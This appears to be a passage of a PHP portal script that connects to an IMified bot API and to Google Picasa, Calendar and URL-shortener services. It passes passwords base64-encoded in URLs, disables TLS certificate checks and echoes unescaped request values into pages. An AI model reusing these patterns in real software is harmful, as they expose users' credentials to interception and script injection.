                                        redirect(scriptpath()."?api=imified&skin=".$skincolor."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u"))));
                                        break;
                                }
                                if (trim(request("msg")) == ""){
                                        $tag->jscento();
                                ?>      
                                
<script>
function changeimg()
{
 document.getElementById("ccimg").src = '<?php echo ScriptPath()?>?api=checkcode&a=' + Math.random();
}
</script>                               
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
<FORM ACTION="<?php echo scriptpath()."?api=imified&skin=".$skincolor."&action=sendmessage&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&botkey=".encodeuri($botkey)."&imid=".encodeuri(trim(request("imid")))."&imuser=".trim(request('imuser'))."&imnetwork=".trim(request('imnetwork'))."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")))."&refer=".encodeuri(trim(request("refer")))?>" METHOD="POST" NAME="imified">
        <tr class="tdtbg">
                <td align="left" colspan="3" width="100%">&nbsp; [ <a style="color:#000000" href="<?php echo ScriptPath()."?api=imified&pagesize=".encodeuri($pagesize)."&page=".encodeuri("1")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&botkey=".encodeuri(trim($botkey))."&skin=".$skincolor."&action=".encodeuri("getallusers")."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")))?>" target=_self>好友</a> ] </td>
        </tr>
</table>
<table width="95%" id="sendmsgbox"" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr>
                <td>
                        <table width="100%" height="100%" align="center" valign="middle" cellspacing="0" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
                                <tr>
                                        <td align="center" width="90%" height="90%" valign="center">
                                                <script>
                                                        document.getElementById("sendmsgbox").height=document.body.offsetHeight*0.55;
                                                </script>
                                                <textarea <?php  $style->textarea("#FCFC9D",""); ?> style="width:90%;height:150px;MARGIN-BOTTOM: 5px; OVERFLOW: auto;" type="text"  id="msg" name="msg" wrap="virtual" onpropertychange="imified.count.value=imified.msg.value.length;"><?php if(trim(request("t"))!="" || trim(request("u"))!="" || trim(request("c"))!="") {echo "标题：".unescape(trim(request("t")))." ； 链接：".unescape(trim(request("u")))." ； 内容：".unescape(trim(request("c")));}?></textarea>
                                        </td>
                                </tr>
                        </table>
                </td>
        </tr>
</table>
<table width="95%" height="30" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr>
                <td align="center" width="20%">
                        <input <?php  $style->textarea("#FCFC9D","");?> style="width:7%;height:18px;" type="text" id="count" name="count" onKeyUp="value=value.replace(/[^(0-9|\;),]/g,'')" value="0" readOnly /> &nbsp验证码：<input <?php echo $style->textarea("#FCFC9D","") ?> maxlength="4" name="checkcode" id="checkcode" class="text" type="text" size="7">&nbsp;<a href="javascript:changeimg()" title="看不清楚？换一个！"><IMG id="ccimg" height="14.5" src="<?php echo ScriptPath()?>?api=checkcode" border="0"></a>
                </td>
        </tr>
</table>
<table width="88" align="center" cellspacing="0" cellpadding="0" bgcolor="#FFFFFF" class="">
        <tr>
                <td align="right" height="30" width=33%>
                </td>
                <td align="center" height="30" width=33%>
                        <span id="vieweditbutton"><input type="button" id='viewedit' class="button" value="预览" style="WIDTH: 50px" ID="editorsubmit" class=Bsbttn onclick="javascript:view2edit();">&nbsp;</span><span id="editorsubmit"><input type="submit" class="button" value="发送" style="WIDTH: 50px" class=Bsbttn onclick="javascript:submiteditor();"></span>&nbsp;<input type="button" class="button" value="取消" style="WIDTH: 50px" onclick="javascript:parent.location.href='viewmailbox.asp?GRSN=4379197'" class=Bsbttn>&nbsp;
                </td>
                <td align="right" height="30" width=33%>
                </td>
        </tr>
</FORM>         
</table>
                                <?php 
                                        //$tag->jscentoload("imified","msg","Cento");                           
                                }       
                                elseif (trim($_POST["msg"]) != ""){
                                        If ($_SESSION['ValidCode'] != "" && $_SESSION['ValidCode'] != trim(request("checkcode"))){
                                                if (trim(request("checkcode")) != ""){
                                                        AlertBack("四位验证码错误！" , 1);
                                                        break;
                                                }       
                                                elseif (trim(request("checkcode")) == ""){
                                                        AlertBack("四位验证码为空！" , 1);
                                                        break;
                                                }               
                                        }

                                        redirect(scriptpath()."?api=imified&skin=".$skincolor."&imid=".encodeuri(trim(request("imid")))."&imuser=".encodeuri(trim(request("imuser")))."&imnetwork=".encodeuri(trim(request("imnetwork")))."&uname=".encodeuri(request("uname"))."&pwd=".encodeuri(trim(request("pwd")))."&botkey=".encodeuri(trim($botkey))."&action=".trim(request("action"))."&checkcode=".trim(request("checkcode"))."&msg=".encodeuri(trim($_POST["msg"]))."&refer=".encodeuri(trim(request("refer")))."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u"))));
                                        break;
                                }       
                                elseif (trim(request("msg")) != ""){
                                        if (($_SERVER['SERVER_NAME'] == "localhost") || ($_SERVER['SERVER_NAME'] == "127.0.0.1")){
                                                $xmlstr = '<rsp stat="ok">'.
                                                                '<success msg="sent"/>'.
                                                                '</rsp>';
                                        }       
                                        else{   
                                                $ch = curl_init();
                                                $url = "https://www.imified.com/api/bot/";
                                                $data = array(
                                                        'botkey' => $botkey,
                                                        'apimethod' => 'send',
                                                        'userkey' => trim(request("imid")), 
                                                        'msg' => iconv('gb2312','utf-8','<'.trim(request('imuser')).'-'.trim(request('imnetwork')).'> '.trim(request("msg")).$sCrLf)
                                                );
                                                curl_setopt($ch, CURLOPT_URL, $url);
                                                curl_setopt($ch, CURLOPT_HEADER, 0);
                                                curl_setopt($ch, CURLOPT_USERPWD, base64_decode(trim(request("uname"))).':'.base64_decode(trim(request("pwd"))));
                                                curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
                                                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                                                curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                                                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);    
                                                curl_setopt($ch, CURLOPT_TIMEOUT, 150);
                                                $xmlstr = curl_exec($ch);
                                                curl_close($ch);
                                        }
                                        
                                        $objXml = new DOMDocument();  
                                        $objXml->preserveWhiteSpace = true;
                                        $objXml->async = false; 
                                        $objXml->loadXML($xmlstr);                                      
                                        
                                        if (!$objXml->getElementsByTagName("rsp")->item(0)->attributes->item(0)->nodeValue){
                                        ?>
<table width="90%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center"> 查 询 结 果 </td>
        </tr>
        <tr class="tdbg">
                <td align="center" id="result">
                <?php  AlertBack ("系统接口发生意外错误，请稍后重试！" ,2)?>
                </td>
        </tr>   
</table>                        
                                        <?php 
                                        }
                                        elseif ($objXml->getElementsByTagName("rsp")->item(0)->attributes->item(0)->nodeValue != 'ok'){
                                                AlertBack ($objXml->getElementsByTagName("err")->item(0)->attributes->item(0)->nodeValue , 2);
                                        }
                                        elseif ($objXml->getElementsByTagName("rsp")->item(0)->attributes->item(0)->nodeValue == 'ok'){ 
                                                $timeout = "5000";
                                        ?>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center"> 操 作 结 果 </td>
        </tr>
        <tr class="tdbg">
                <td align="center" id="result">
                信息发送成功！<?php  echo $timeout/1000?> 秒后返回上一页
                </td>
        </tr>   
                                        <?php 
                                                echo "<p align=center><script>window.setTimeout(\"location.href=\'".trim(request("refer"))."\'\",".$timeout.");</script></p>"
                                        ?>
</table>                        
                                        <?php 
                                        
                                        }
                                }
                                break;
                        case 'getinfo':
                                $tag->getinfo(scriptpath()."?api=imified&skin=".$skincolor."&urlflag=1&action=".encodeuri("getallusers")."&page=1&pagesize=".$pagesize,'link','780','500');
                                break;
                        default :
                                ?>
<script>
function changeimg()
{
 document.getElementById("ccimg").src = '<?php echo ScriptPath()?>?api=checkcode&a=' + Math.random();
}
</script>
<table width="95%" height="" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg" height="35">
                <td align="center">
                        <form action="<?php echo ScriptPath()?>?api=imified&skin=<?php echo $skincolor;?>&action=getallusers&c=<?php echo encodeuri(trim(request("c")));?>&t=<?php echo encodeuri(trim(request("t")));?>&u=<?php echo encodeuri(trim(request("u")));?>" method="post" name="imified">
                        &nbsp用户名：<input type="text" class="text" name="uname" value="" style="height:20px;width:20%;font-size:11px" <?php  $style->textarea("#FCFC9D","") ?>>  
                        &nbsp密码：<input type="password" class="text" name="pwd" value="" style="height:20px;width:10%;font-size:11px" <?php  $style->textarea("#FCFC9D","") ?>> 
                        &nbspKEY：<input type="password" class="text" name="botkey" value="" style="height:20px;width:13%;font-size:11px" <?php  $style->textarea("#FCFC9D","") ?>> 
                        &nbsp验证码：<input <?php echo $style->textarea("#FCFC9D","") ?> maxlength="4" name="checkcode" id="checkcode" class="text" type="text" size="7">&nbsp;<a href="javascript:changeimg()" title="看不清楚？换一个！"><IMG id="ccimg" height="14.5" src="<?php echo ScriptPath()?>?api=checkcode" border="0"></a>
                        &nbsp<input type="submit" class="button" name="docinSubmit" value=" Go ">
                </td>
        </tr>   
</table>
<?php                       
                                
                } //action switch end
                $style->footer();
                break;
        
        } //action switch end   
exit;   
}       
?>

<?php 
function google(){
header('Content-Type: text/html; charset=gb2312');
?>
<head>
<?php 
$style = new css();
$style->ico();
switch (trim(request('api'))) {  // case start
        case "picasa":
                $style->title("X3193 - 相册");
        	break;
        case "calendar":
                $style->title("X3193 - 日历");
        	break;
        case "urlshortener":
                $style->title("X3193 - 网址");
        	break;
}
$skincolor = selstyle(trim(request("skin")));

$sCrLf = chr(13) . chr(10); // 回车 + 换行
?>

<table width="100%" height="100%" align="center" valign="center">
        <tr>
                <td align="center" valign="middle">
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr>
                <td align="left" style="border:0">
                <?php  selskin(); ?>
                </td>
                <td align="right" style="border:0">             
                        <?php  
                         IF(!is_wap())
                        	sellink("主页|插件|搜索|地球|域名|相册|网址|FTP|读书|邮箱|游戏|邮件|短片|股票|VPN",$skincolor);
                        else
                        	sellink("主页|搜索|域名|相册|网址|FTP|邮箱|邮件|短片",$skincolor);
                        ?>
                </td>
        </tr>           
</table>
<table width="95%" height="3" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF">
        <tr>
                <td align="left">
                        
                </td>
        </tr>   
</table>
<?php 

// 每页条数
if (trim(request('pagesize')) == "")
        $pagesize = 30;
elseif (trim(request('pagesize')) > 50)
        $pagesize = 50;
else
        $pagesize = trim(request('pagesize'));


$stract = trim(request("action"));

if (trim(request("page")) != "" && is_numeric(trim(request("page"))) !== false){
        $page = floor(trim(request("page")));
}       
else{
        $page = floor("1");
}

//$userid = arrmember(split('[@]',base64_decode(trim(request("uname")))),0);
$versionID = "1";

if (trim(request("authclientLogin")) != "" && stripos(trim(request("authclientLogin")),"bad")){
        switch (trim(request('api'))) {  // case start
        	case "picasa":
                        redirect(ScriptPath()."?api=picasa&skin=".$skincolor);
                	break;
        	case "calendar":
                        redirect(ScriptPath()."?api=calendar&skin=".$skincolor);
	                break;
        	case "urlshortener":
                        redirect(ScriptPath()."?api=urlshortener&skin=".$skincolor);
	                break;
        }
}       

$tag = New TagAction(); 

switch (trim(request('action'))) {  // case start
    	case "photo.getinfo":
		$tag->getinfo(scriptpath()."?api=picasa&skin=".$skincolor."&urlflag=1&action=".encodeuri("album.list")."&page=1&pagesize=".$pagesize,'image','780','500');
      		break;
    	case "urlshortener.getinfo":
		$tag->getinfo(scriptpath()."?api=urlshortener&skin=".$skincolor."&urlflag=1&action=".encodeuri("urlshortener.cento")."&page=1&pagesize=".$pagesize,'link','780','500');
      		break;
        case "album":
                if (trim($_POST["uname"]) != "" && trim($_POST["pwd"]) != ""){
                        If ($_SESSION['ValidCode'] != "" && $_SESSION['ValidCode'] != trim(request("checkcode"))){
                                if (trim(request("checkcode")) != ""){
                                			if(!is_wap()){
                                        AlertBack("四位验证码错误！" , 1);
                                        break;
                                      }  
                                      else{
                                    	?>

<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center"> 操 作 结 果 </td>
        </tr>           

        <tr class="tdbg">
                <td align="center" id="result">
											四位验证码错误！
											<a hreF='#' onclick='window.location.href="<?php echo trim(request("refer"))?>";'>返回</a>
                </td>
        </tr>  
</table> 
																			<?php 
                        break;
                                    }
                                }       
                                elseif (trim(request("checkcode")) == ""){
                                        AlertBack("四位验证码为空！" , 1);
                                        break;
                                }               
                        }
                        redirect(scriptpath()."?api=picasa&skin=".$skincolor."&uname=".encodeuri(Base64_encode(trim($_POST["uname"])))."&pwd=".encodeuri(Base64_encode(trim($_POST["pwd"])))."&action=".trim(request("action"))."&checkcode=".trim(request("checkcode"))."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u"))));
                        break;
                }
                $google_album = new google_class();
                if (trim(request('uname')) != "" && trim(request('pwd')) != "" && trim(request("authclientLogin")) == ""){
	               	$AuthClientLogin = $google_album->googleauthclientlogin(trim(request("uname")),trim(request("pwd")),trim(request('action')));
	                redirect(ScriptPath()."?api=picasa&pagesize=".encodeuri($pagesize)."&page=".encodeuri("1")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&skin=".$skincolor."&action=".encodeuri("album.list")."&authclientLogin=".encodeuri(trim($AuthClientLogin))."&c=".encodeuri(trim(request("c")))."&u=".encodeuri(trim(request("u")))."&t=".encodeuri(trim(request("t"))));
              	}
              	elseif ($_SESSION["google"]["uname"] != "" && $_SESSION["google"]["pwd"] != ""){
	               	$AuthClientLogin = $google_album->googleauthclientlogin(trim($_SESSION["google"]["uname"]),trim($_SESSION["google"]["pwd"]),trim(request('action')));
	                redirect(ScriptPath()."?api=picasa&pagesize=".encodeuri($pagesize)."&page=".encodeuri("1")."&uname=".encodeuri(trim($_SESSION["google"]["uname"]))."&pwd=".encodeuri(trim($_SESSION["google"]["pwd"]))."&skin=".$skincolor."&action=".encodeuri("album.list")."&authclientLogin=".encodeuri(trim($AuthClientLogin))."&c=".encodeuri(trim(request("c")))."&u=".encodeuri(trim(request("u")))."&t=".encodeuri(trim(request("t"))));
              	}
                break;
        case "calendar":
                if (trim($_POST["uname"]) != "" && trim($_POST["pwd"]) != ""){
                        If ($_SESSION['ValidCode'] != "" && $_SESSION['ValidCode'] != trim(request("checkcode"))){
                                if (trim(request("checkcode")) != ""){
                                			if(!is_wap()){
                                        AlertBack("四位验证码错误！" , 1);
                                        break;
                                      }  
                                      else{
                                    	?>

<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center"> 操 作 结 果 </td>
        </tr>           

        <tr class="tdbg">
                <td align="center" id="result">
											四位验证码错误！
											<a hreF='#' onclick='window.location.href="<?php echo trim(request("refer"))?>";'>返回</a>
                </td>
        </tr>  
</table> 
																			<?php 
                        break;
                                    }
                                }       
                                elseif (trim(request("checkcode")) == ""){
                                        AlertBack("四位验证码为空！" , 1);
                                        break;
                                }               
                        }

                        redirect(scriptpath()."?api=calendar&skin=".$skincolor."&uname=".encodeuri(Base64_encode(trim($_POST["uname"])))."&pwd=".encodeuri(Base64_encode(trim($_POST["pwd"])))."&action=".encodeuri(trim(request("action")))."&checkcode=".trim(request("checkcode"))."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u"))));
                        break;
                }
                $google_calendar = new google_class();
                if (trim(request('uname')) != "" && trim(request('pwd')) != "" && trim(request("authclientLogin")) == ""){
  	              $AuthClientLogin = $google_calendar->googleauthclientlogin(trim(request("uname")),trim(request("pwd")),trim(request('action')));
  	               redirect(ScriptPath()."?api=calendar&pagesize=".encodeuri($pagesize)."&page=".encodeuri("1")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&skin=".$skincolor."&action=".encodeuri("calendar.list")."&authclientLogin=".$AuthClientLogin."&c=".encodeuri(trim(request("c")))."&u=".encodeuri(trim(request("u")))."&t=".encodeuri(trim(request("t"))));
              	}
              	elseif ($_SESSION["google"]["uname"] != "" && $_SESSION["google"]["pwd"] != ""){
  	              $AuthClientLogin = $google_calendar->googleauthclientlogin(trim($_SESSION["google"]["uname"]),trim($_SESSION["google"]["pwd"]),trim(request('action')));
	                redirect(ScriptPath()."?api=calendar&pagesize=".encodeuri($pagesize)."&page=".encodeuri("1")."&uname=".encodeuri(trim($_SESSION["google"]["uname"]))."&pwd=".encodeuri(trim($_SESSION["google"]["pwd"]))."&skin=".$skincolor."&action=".encodeuri("calendar.list")."&authclientLogin=".$AuthClientLogin."&c=".encodeuri(trim(request("c")))."&u=".encodeuri(trim(request("u")))."&t=".encodeuri(trim(request("t"))));
	               	//$AuthClientLogin = $google_album->googleauthclientlogin(trim($_SESSION["google"]["uname"]),trim($_SESSION["google"]["pwd"]),trim(request('action')));
	                //redirect(ScriptPath()."?api=picasa&pagesize=".encodeuri($pagesize)."&page=".encodeuri("1")."&uname=".encodeuri(trim($_SESSION["google"]["uname"]))."&pwd=".encodeuri(trim($_SESSION["google"]["pwd"]))."&skin=".$skincolor."&action=".encodeuri("album.list")."&authclientLogin=".encodeuri(trim($AuthClientLogin))."&c=".encodeuri(trim(request("c")))."&u=".encodeuri(trim(request("u")))."&t=".encodeuri(trim(request("t"))));
              	}
                break;                
                //echo $AuthClientLogin;
                break;
        case "calendar.list":
                if (trim(request("logout")) != ""){
                        session_start();
if(substr(PHP_VERSION, 0, 3)=='5.4'){
		//session_register("X3193");
}
elseif(substr(PHP_VERSION, 0, 3)=='5.3'){
                        session_register("google");
}                         

                        //$_SESSION["google"]=array('album' => array('uname' => '', 'pwd' => '', 'authclientLogin' => ''));                                     
                        //session_register("uname"); 
                        $_SESSION["google"]["uname"] = "";      
                        $_SESSION["google"]["pwd"] = "";        
                        $_SESSION["google"]["authclientLogin"] = "";    
                        //session_register("pwd"); 
                        //$_SESSION["pwd"] = "";        
                        //session_register("authclientLogin"); 
                        //$_SESSION["authclientLogin"] = "";    
                        redirect(scriptpath()."?api=calendar&skin=".$skincolor."&uname=&pwd=&action=".encodeuri(trim(request("action")))."&urlflag=1&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")))."&authclientLogin=".encodeuri(trim(request("authclientLogin"))));
                        break;
                }
                elseif ($_SESSION["google"]["uname"] != "" && $_SESSION["google"]["pwd"] != "" && $_SESSION["google"]["authclientLogin"] != "" && trim(request("uname")) == "" && trim(request("pwd")) == "" && trim(request("authclientLogin")) == ""){
                        redirect(scriptpath()."?api=calendar&skin=".$skincolor."&uname=".encodeuri(trim($_SESSION["google"]["uname"]))."&pwd=".encodeuri(trim($_SESSION["google"]["pwd"]))."&action=".trim(request("action"))."&checkcode=".trim(request("checkcode"))."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")))."&authclientLogin=".encodeuri($_SESSION["google"]["authclientLogin"]));
                        break;
                }       
                elseif (trim(request('uname')) != "" && trim(request('pwd')) != ""){
                        session_start();
if(substr(PHP_VERSION, 0, 3)=='5.4'){
		//session_register("X3193");
}
elseif(substr(PHP_VERSION, 0, 3)=='5.3'){
                        session_register("google");
}
                        //$_SESSION["google"]=array('album' => array('uname' => trim(request("uname")), 'pwd' => trim(request("pwd")), 'authclientLogin' => trim(request("authclientLogin"))),'urlshortener' => array('uname' => trim(request("uname")), 'pwd' => trim(request("pwd")), 'authclientLogin' => trim(request("authclientLogin"))));                                        
                        $_SESSION["google"]["uname"] = trim(request("uname"));  
                        $_SESSION["google"]["pwd"] = trim(request("pwd"));      
                        $_SESSION["google"]["authclientLogin"] = trim(request("authclientLogin"));      
                        //session_register("uname"); 
                        //$_SESSION["uname"] = trim(request("uname"));  
                        //session_register("pwd"); 
                        //$_SESSION["pwd"] = trim(request("pwd"));      
                        //session_register("authclientLogin"); 
                        //$_SESSION["authclientLogin"] = trim(request("authclientLogin"));
                }       
                elseif (trim(request("uname")) == "" || trim(request("pwd")) == ""){
                        redirect(scriptpath()."?api=calendar&skin=".$skincolor."&uname=&pwd=&action=&checkcode=".trim(request("checkcode"))."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")))."&authclientLogin=".encodeuri(trim(request("authclientLogin"))));
                        break;
                }       
                elseif (trim(request("authclientLogin")) == "" || stripos(trim(request("authclientLogin")),"Bad")){
                        redirect(scriptpath()."?api=calendar&skin=".$skincolor."&uname=&pwd=&action="."&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")))."&authclientLogin=");
                        break;
                }
                $google_urlshortener = new google_class();
                $jsonstr = $google_urlshortener->googlecalendarlist(trim(request("authclientLogin")),$page,$pagesize);
                //print_r($jsonstr);
                $pagesize = $jsonstr['pagesize'];
                if ($jsonstr['totalitem'] > $pagesize) $strpagesize = $pagesize; else $strpagesize = $jsonstr['totalitem'];
                ?>
<script language="JavaScript" type="text/javascript">
function selitemall()
{
 i=<?php echo $strpagesize*($page-1);?>;
 while(eval('document.calendar.chidd'+i))
 {
  eval('document.calendar.chidd'+i).checked = document.calendar.allitem.checked;
  i++;
 }
}
function delitem()
{
 if(!confirm('确定删除选中的文件吗?')) return;
 document.calendar.action='<?php echo ScriptPath()."?api=calendar&action=".encodeuri("calendar.remove")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".trim(request("pagesize"))."&page=".$page."&skin=".$skincolor."&authclientLogin=".encodeuri(trim(request("authclientLogin")))."&refer=".encodeuri(httpPath()."?".$_SERVER['QUERY_STRING']);?>&delok=1';
 document.calendar.submit();
}
</script>       
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center" colspan="3"> 查 询 结 果 : 共 <?php echo $jsonstr['totalitem'];?> 条 </td>
        </tr>
</table>
<table width="95%" align="center" cellspacing="0" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="left" colspan="3" width="100%"> [ <a style="color:#000000" href="<?php echo ScriptPath()."?api=calendar&pagesize=".encodeuri($pagesize)."&page=".encodeuri("1")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&skin=".$skincolor."&action=".encodeuri(trim(request('action')))."&u=".encodeuri(trim(request("u")))."&t=".encodeuri(trim(request("t")))."&c=".encodeuri(trim(request("c")))."&authclientLogin=".trim(request("authclientLogin"))?>" target=_self>网址</a> - <?php echo $jsonstr['authordisplayName'];?> <?php  if (trim($_SESSION["google"]["uname"]) != "" && trim($_SESSION["google"]["pwd"]) != "" && trim($_SESSION["google"]["authclientLogin"]) != "") {?> - <a style="color:#000000;"href="<?php echo scriptpath()."?api=calendar&skin=".$skincolor."&uname=".encodeuri(Base64_encode(trim(request("uname"))))."&pwd=".encodeuri(Base64_encode(trim(request("uname"))))."&action=".encodeuri(trim(request("action")))."&urlflag=1&c=".encodeuri(trim(request("c")))."&t=".encodeuri(trim(request("t")))."&u=".encodeuri(trim(request("u")))."&logout=1&authclientLogin=".trim(request("authclientLogin"));?>" target="_self">退出</a><?php  } ?> ] </td>
        </tr>
</table>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
<form name="calendar" method="post" action="">
                <?php 
                $totalitem = $jsonstr['totalitem'];
                if (fmod($totalitem, $pagesize) == 0){
                        $totalpage=$totalitem/$pagesize;
                }       
                else{
                        $totalpage=ceil($totalitem/$pagesize);
                }       
                if ($totalpage == $page)
                        $endid = $totalitem-1;
                elseif ($totalpage > $page)
                        $endid = floor($strpagesize*($page)-1);
                elseif ($totalpage < $page){
                        $endid = floor($strpagesize*($page-1)-1);
                }                       
                $endid = $endid - $pagesize * ($page-1);
                ?>
        <tr class="tdbg">
                <td align="center" width=4%>
                        <input type="checkbox" id="allitem" name="allitem" value="" onclick="javascript:selitemall();" />
                </td>   
                <td align="center" width=20%>
                        名称
                </td>
                <td align="center" width=36%>
                        作者
                </td>
                <td align="center" width=10%>
                        状态
                </td>
                <td align="center" width=15%>
                        身份
                </td>
                <td align="center" width=15%>
                        <a style="color:#000000" href="<?php echo ScriptPath();?>?api=calendar&action=<?php echo encodeuri("calendar.create");?>&skin=<?php echo $skincolor;?>&authclientLogin=<?php echo encodeuri(trim(request("authclientLogin")));?>&uname=<?php echo encodeuri(trim(request("uname")));?>&pwd=<?php echo encodeuri(trim(request("pwd")));?>">添加</a> <a style="color:#000000" href="<?php echo ScriptPath();?>?api=calendar&action=<?php echo encodeuri("calendar.search");?>&skin=<?php echo $skincolor;?>&authclientLogin=<?php echo encodeuri(trim(request("authclientLogin")));?>&uname=<?php echo encodeuri(trim(request("uname")));?>&pwd=<?php echo encodeuri(trim(request("pwd")));?>">搜索</a>
                </td> 
        </tr>   
                <?php 
                for($i = 0;$i <= $endid;$i++){
                        //$objHdd = $objList->item($i);
                        ?>
        <tr class="tdbg">
                <td align="center">
                        <input type="checkbox" name="chidd<?php echo $i;?>" id="chidd<?php echo $i;?>" value="chidd<?php echo $i;?>" />
                </td>   
                <td align="center"%>
                        <?php 
                        $urlkind = $jsonstr['items'][$i]['urlkind'];
                        $urlid = $jsonstr['items'][$i]['urlshortlink'];
                        $urllongUrl = $jsonstr['items'][$i]['urllink'];
                        $urlstatus = $jsonstr['items'][$i]['urlstatus'];
                        $urlcreated = $jsonstr['items'][$i]['urlcreatedtime'];
                        echo "<a style=\"color:#000000\" href=\"".$urlid."\" target='_blank'>".$urlid."</a>";
                ?>
                </td>
                <td align="center">
                        <?php 
                        if(strlen($urllongUrl)<='60'){
       	                	echo "<a style=\"color:#000000\" href=\"".$urllongUrl."\" target='_blank'>".$urllongUrl."</a>";
               		}
               		else{
                       		echo "<a style=\"color:#000000\" href=\"".$urllongUrl."\" target='_blank'>".substr($urllongUrl,0,60).'...'."</a>";
               		}
                        ?>
                </td>
                <td align="center">
                        <?php echo $urlstatus?>
                </td>
                <td align="center">
                        <?php echo $urlcreated;?>
                </td>
                <td align="center">
                        <a style="color:#000000" href="<?php echo ScriptPath()."?api=calendar&action=".encodeuri("calendar.share")."&authclientLogin=".encodeuri(trim(request("authclientLogin")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".trim(request("pagesize"))."&page=".$page."&skin=".$skincolor."&urllink=".encodeuri($urlid)."&refer=".encodeuri(httpPath()."?".$_SERVER['QUERY_STRING'])?>">分享</a>
                        <a style="color:#000000" href="<?php echo ScriptPath()."?api=calendar&action=".encodeuri("calendar.study")."&authclientLogin=".encodeuri(trim(request("authclientLogin")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".trim(request("pagesize"))."&page=".$page."&skin=".$skincolor."&urllink=".encodeuri(Base64_encode($urlid))."&refer=".encodeuri(httpPath()."?".$_SERVER['QUERY_STRING'])?>">分析</a>
                </td>
        </tr>   
                <?php 
                }
                ?>
                </td>
        </tr>
</table><table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdbg">
                <td align="center" colspan="3"> 共 <?php  echo $totalpage;?> 页 第  
                <?php 
                echo $page." 页 ".$sCrLf;
                if (floor($page)>1)
                        echo "<a style='color:#000000' href='".ScriptPath()."?api=calendar&action=".encodeuri(trim(request("action")))."&authclientLogin=".encodeuri(trim(request("authclientLogin")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".$pagesize."&page=".($page-1)."&skin=".$skincolor."&u=".encodeuri(trim(request("u")))."&t=".encodeuri(trim(request("t")))."&c=".encodeuri(trim(request("c")))."'>上一页</a> ";
                if (floor($page)>0 && floor($page)<floor($totalpage))
                        echo "<a style='color:#000000' href='".ScriptPath()."?api=calendar&action=".encodeuri(trim(request("action")))."&authclientLogin=".encodeuri(trim(request("authclientLogin")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".$pagesize."&page=".($page+1)."&skin=".$skincolor."&u=".encodeuri(trim(request("u")))."&t=".encodeuri(trim(request("t")))."&c=".encodeuri(trim(request("c")))."'>下一页</a> ";

                				?>
                				<input name="page" value="<?php  echo $page; ?>" style="height:20px;width:40px;font-size:11px;" <?php  $style->textarea("#FCFC9D",""); ?>>
												<input type="submit" class="button" name="gotopage" value=" Go ">                 
                				<?php 

                        
                        ?>
                </td>
        </tr>   
</table>
<?php 
                //$gotopage->gotopage($totalpage,ScriptPath()."?api=calendar&action=".encodeuri(trim(request("action")))."&authclientLogin=".encodeuri(trim(request("authclientLogin")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".encodeuri($pagesize)."&skin=".$skincolor."&u=".encodeuri(trim(request("u")))."&t=".encodeuri(trim(request("t")))."&c=".encodeuri(trim(request("c")))."&gopage=ok&page=","X3193","请在空白处输入要转到的页数");
                break;
        case "urlshortener":

                if (trim($_POST["uname"]) != "" && trim($_POST["pwd"]) != ""){
